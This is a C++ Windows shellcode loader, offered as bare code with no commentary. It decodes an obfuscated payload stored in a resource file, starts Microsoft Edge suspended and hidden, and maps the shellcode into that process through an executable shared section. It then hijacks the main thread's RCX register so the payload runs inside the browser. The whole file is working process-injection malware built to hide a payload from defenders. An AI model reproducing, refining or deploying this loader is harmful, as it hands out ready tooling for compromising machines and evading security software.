#include <Windows.h>
#include <string>
#include <vector>
#include <winternl.h>
#include <iostream>

#include "Native.h"
#include "resource.h"

// extract data of ressources file
std::string resource()
{
    HRSRC hRsrc = NULL;
    hRsrc = FindResource(
        NULL,
        MAKEINTRESOURCE(IDR_RCDATA1),
        RT_RCDATA);

    HGLOBAL hGlobal = NULL;
    hGlobal = LoadResource(NULL, hRsrc);

    PVOID ptr = NULL;
    ptr = LockResource(hGlobal);

    SIZE_T size = NULL;
    size = SizeofResource(NULL, hRsrc);

    std::string result(reinterpret_cast<const char*>(ptr), size);
    return result;
}

// decode
std::vector<BYTE> decode(const std::string& hex) {
    std::vector<BYTE> shellcode;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string hex_byte = hex.substr(i, 2);

        // Replace the letter to hex
        for (char& c : hex_byte)
            if (c >= 'g' && c <= 'p')
                c = '0' + (c - 'g');

        BYTE byte = std::stoi(hex_byte, nullptr, 16);
        shellcode.push_back(byte);
    }
    return shellcode;
}

int main()
{
	std::string hex = resource();
	std::vector<BYTE> shellcode = decode(hex);
	
    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0";

    // create process
    CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info);

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");


    // create section in local process
    HANDLE hSection;
    LARGE_INTEGER szSection = { shellcode.size() };

    NTSTATUS status = ntCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);

    // map section into memory of local process
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;

    status = ntMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // copy shellcode into local memory
    RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

    // map section into memory of remote process
    PVOID hRemoteAddress = NULL;

    status = ntMapViewOfSection(
        hSection,
        process_info->hProcess,
        &hRemoteAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // get context of main thread
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(process_info->hThread, pContext);

    // update rcx context
    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(process_info->hThread, pContext);

    // resume thread
    ResumeThread(process_info->hThread);

    // unmap memory from local process
    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress);
}
